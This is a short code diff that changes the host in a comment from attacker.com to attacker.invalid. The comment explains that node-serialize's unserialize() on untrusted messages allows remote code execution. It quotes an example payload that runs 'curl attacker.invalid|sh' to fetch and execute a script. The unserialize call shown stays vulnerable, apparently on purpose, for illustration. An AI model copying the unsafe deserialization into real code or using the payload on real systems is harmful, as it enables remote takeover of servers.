@@ -33,7 +33,7 @@ async function startTaskConsumer() {
 
     // BAD: node-serialize.unserialize() executes functions embedded in the payload.
     // A malicious message like:
-    //   {"cmd":"_$$ND_FUNC$$_function(){require('child_process').exec('curl attacker.com|sh')}()"}
+    //   {"cmd":"_$$ND_FUNC$$_function(){require('child_process').exec('curl attacker.invalid|sh')}()"}
     // triggers RCE the moment unserialize() is called.
     const task = serialize.unserialize(raw);
 
